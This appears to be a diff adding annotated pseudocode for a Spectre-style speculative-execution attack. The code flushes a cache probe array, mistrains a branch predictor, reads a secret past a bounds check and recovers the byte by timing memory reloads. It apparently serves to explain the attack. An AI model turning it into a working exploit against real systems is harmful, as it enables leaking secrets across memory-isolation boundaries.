@@ -1,0 +1,34 @@
+* // Establish channel by flushing shared Array_A accessible to attacker
+int T[256]
+char Array_A[256*4K]
+clflush (Array_A)
+
+*  // Train the branch predictor to predict not taken
+train_branch_predictor ()
+
+mov rbx, Array_A
+mov rcx, Array_Victim
+mov rdx, Secret_Location in Array_Victim
+
+*  // if (x < Array_Victim_Size)
+*  // y = Array_A[Array_Victim[x] * 256];
+
+*  // rdx stores the queried index x and if x >
+*  // Victim_Array_Size, the branch should be taken
+cmp rdx, Array_Victim_Size // Authorization
+ja .BRANCH_TAKEN
+*  // Speculative Execution window starts
+
+*  // Illegal memory access of Secret_Location
+mov al, byte [Array_Victim + rdx] // Access
+
+ shl rax , 0xc // Use
+mov rbx, qword [rbx + rax ] // Send
+
+.BRANCH_TAKEN: ...
+
+*  // Reload Array_A to recover the secret byte
+for( i=0; i<256; i++){
+ T[i ] = measure_access_time(Array_A + i * 4KB)
+}
+recovered_byte = argmin_i(T[i ]) . // Receive
